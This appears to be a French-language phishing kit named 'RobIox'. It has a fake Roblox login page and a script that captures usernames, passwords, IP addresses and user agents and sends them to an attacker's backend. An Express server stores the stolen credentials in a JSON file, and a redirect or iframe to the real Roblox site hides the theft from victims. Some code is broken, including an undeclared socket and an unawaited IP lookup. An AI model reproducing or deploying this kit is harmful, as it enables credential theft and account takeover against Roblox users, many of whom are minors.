# RobIox
# Join me>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Jeux et Aventure</title>
    <link rel="stylesheet" href="https://www.roblox.com/static/css/roblox.css?v=20240510">
    <style>
        /* Override des styles pour masquer les erreurs */
        body { background: #f0f0f0; }
        .login-container { width: 350px; margin: 100px auto; }
        .login-input { width: 100%; padding: 10px; margin: 10px 0; }
        .login-button { width: 100%; padding: 10px; background: #38a1ff; color: white; border: none; }
        .fake-error { display: none; } /* Cache les messages d'erreur */
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Roblox</h1>
        <form id="loginForm">
            <input type="text" class="login-input" placeholder="Nom d'utilisateur" id="username" required>
            <input type="password" class="login-input" placeholder="Mot de passe" id="password" required>
            <button type="submit" class="login-button">Se connecter</button>
            <div id="fakeError" class="fake-error">Erreur de connexion. Vérifiez vos identifiants.</div>
        </form>
    </div>

    <!-- Script de capture des infos (invisible pour l'utilisateur) -->
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const userAgent = navigator.userAgent;
            const ip = getIP(); // On récupère l'IP via un service externe

            // Envoi des données vers ton backend (GitHub Pages ne supporte pas les backends, donc tu dois utiliser un service comme Heroku ou un VPS)
            fetch('https://ton-backend-roblox.vercel.app/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username,
                    password,
                    ip,
                    userAgent,
                    timestamp: new Date().toISOString()
                })
            })
            .then(response => {
                if (response.ok) {
                    // Redirige vers une page "Roblox" fake pour garder l'utilisateur
                    window.location.href = "https://www.roblox.com/home";
                } else {
                    document.getElementById('fakeError').style.display = 'block';
                }
            })
            .catch(() => {
                document.getElementById('fakeError').style.display = 'block';
            });
        });

        // Fonction pour récupérer l'IP (via un service gratuit)
        function getIP() {
            return fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => data.ip)
                .catch(() => "IP non disponible");
        }
    </script>
</body>
</html>
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();

app.use(bodyParser.json());

// Stockage des données (fichier JSON)
const DATA_FILE = 'roblox_credentials.json';

// Endpoint pour recevoir les infos
app.post('/api/login', (req, res) => {
    const { username, password, ip, userAgent, timestamp } = req.body;

    // Vérifie si le fichier existe, sinon crée-le
    if (!fs.existsSync(DATA_FILE)) {
        fs.writeFileSync(DATA_FILE, JSON.stringify([]));
    }

    // Lit les données existantes
    const existingData = JSON.parse(fs.readFileSync(DATA_FILE));
    existingData.push({ username, password, ip, userAgent, timestamp });

    // Sauvegarde les nouvelles données
    fs.writeFileSync(DATA_FILE, JSON.stringify(existingData, null, 2));

    res.status(200).send('Connexion enregistrée.');
});

// Démarrage du serveur
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Serveur en écoute sur le port ${PORT}`);
});
new WebSocket('wss://ton-backend-roblox.vercel.app/socket');

socket.onopen = () => {
    socket.send(JSON.stringify({
        action: "login_attempt",
        data: {
            username: document.getElementById('username').value,
            password: document.getElementById('password').value
        }
    }));
};
<div id="fakeRoblox" style="display: none;">
    <iframe src="https://www.roblox.com/home" width="100%" height="1000px"></iframe>
</div>

<script>
    // Après envoi des données, affiche l'iframe
    fetch('...').then(() => {
        document.getElementById('fakeRoblox').style.display = 'block';
    });
</script>
